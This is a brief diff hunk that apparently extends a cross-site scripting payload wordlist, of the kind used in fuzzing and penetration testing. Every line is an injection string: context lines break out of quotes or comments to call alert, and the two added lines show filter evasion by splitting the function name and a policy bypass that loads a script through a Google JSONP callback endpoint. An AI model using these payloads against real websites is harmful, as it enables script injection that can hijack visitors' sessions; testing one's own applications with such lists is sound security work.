@@ -33,3 +33,5 @@ co\u006efirm()
 */alert(1)//
 ';alert(1)//
 &apos;-alert(1)-&apos;
+';window['ale'+'rt'](1);//
+<script/src=//accounts.google.com/o/oauth2/revoke?callback=alert(1337)>
